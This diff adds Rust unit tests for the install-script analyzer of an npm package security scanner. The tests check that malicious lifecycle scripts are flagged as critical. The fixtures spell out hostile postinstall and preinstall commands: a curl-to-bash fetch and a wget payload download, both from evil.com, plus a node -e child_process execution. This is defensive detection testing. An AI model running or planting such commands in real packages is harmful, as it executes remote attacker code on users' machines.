@@ -146,3 +146,143 @@ fn check_missing_script_file(
         }
     }
 }
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use std::path::Path;
+
+    use crate::analyzers::Analyzer;
+    use crate::registry::package::PackageMetadata;
+    use crate::types::{FindingCategory, Severity};
+
+    fn default_metadata() -> PackageMetadata {
+        PackageMetadata {
+            name: Some("test-pkg".into()),
+            description: None,
+            versions: std::collections::HashMap::new(),
+            time: std::collections::HashMap::new(),
+            maintainers: None,
+            dist_tags: None,
+            extra: std::collections::HashMap::new(),
+        }
+    }
+
+    fn analyze_pkg(package_json: serde_json::Value) -> Vec<Finding> {
+        let analyzer = InstallScriptAnalyzer;
+        let files: Vec<(PathBuf, String)> = vec![];
+        let metadata = default_metadata();
+        let tmp = Path::new("/tmp");
+        let ctx = AnalysisContext {
+            name: "test-pkg",
+            version: "1.0.0",
+            files: &files,
+            package_json: &package_json,
+            metadata: &metadata,
+            package_dir: tmp,
+        };
+        analyzer.analyze(&ctx)
+    }
+
+    #[test]
+    fn flags_postinstall_curl_bash() {
+        let pkg = serde_json::json!({
+            "scripts": {
+                "postinstall": "curl http://evil.com/setup.sh | bash"
+            }
+        });
+        let findings = analyze_pkg(pkg);
+        let critical: Vec<_> = findings
+            .iter()
+            .filter(|f| f.severity == Severity::Critical)
+            .collect();
+        assert!(
+            !critical.is_empty(),
+            "should flag postinstall with curl|bash as CRITICAL, got: {:?}",
+            findings
+        );
+        assert!(critical[0].category == FindingCategory::InstallScript);
+    }
+
+    #[test]
+    fn flags_postinstall_wget() {
+        let pkg = serde_json::json!({
+            "scripts": {
+                "postinstall": "wget http://evil.com/payload -O /tmp/p && chmod +x /tmp/p"
+            }
+        });
+        let findings = analyze_pkg(pkg);
+        let critical: Vec<_> = findings
+            .iter()
+            .filter(|f| f.severity == Severity::Critical)
+            .collect();
+        assert!(
+            !critical.is_empty(),
+            "should flag postinstall with wget as CRITICAL, got: {:?}",
+            findings
+        );
+    }
+
+    #[test]
+    fn flags_preinstall_node_e() {
+        let pkg = serde_json::json!({
+            "scripts": {
+                "preinstall": "node -e \"require('child_process').exec('whoami')\""
+            }
+        });
+        let findings = analyze_pkg(pkg);
+        let critical: Vec<_> = findings
+            .iter()
+            .filter(|f| f.severity == Severity::Critical)
+            .collect();
+        assert!(
+            !critical.is_empty(),
+            "should flag preinstall with node -e as CRITICAL, got: {:?}",
+            findings
+        );
+    }
+
+    #[test]
+    fn skips_safe_scripts() {
+        for safe in &["husky install", "patch-package", "node-gyp rebuild"] {
+            let pkg = serde_json::json!({
+                "scripts": {
+                    "postinstall": safe
+                }
+            });
+            let findings = analyze_pkg(pkg);
+            assert!(
+                findings.is_empty(),
+                "should skip safe script '{}', but got: {:?}",
+                safe,
+                findings
+            );
+        }
+    }
+
+    #[test]
+    fn no_scripts_no_findings() {
+        let pkg = serde_json::json!({
+            "name": "safe-package",
+            "version": "1.0.0"
+        });
+        let findings = analyze_pkg(pkg);
+        assert!(findings.is_empty(), "no scripts should produce no findings");
+    }
+
+    #[test]
+    fn empty_script_value_no_crash() {
+        let pkg = serde_json::json!({
+            "scripts": {
+                "postinstall": ""
+            }
+        });
+        // Should not panic; empty string is not dangerous so it gets a Medium finding
+        let findings = analyze_pkg(pkg);
+        // Just verify it didn't crash -- the empty script gets a Medium "present" finding
+        assert!(
+            findings.iter().all(|f| f.severity != Severity::Critical),
+            "empty script should not be CRITICAL"
+        );
+    }
+}
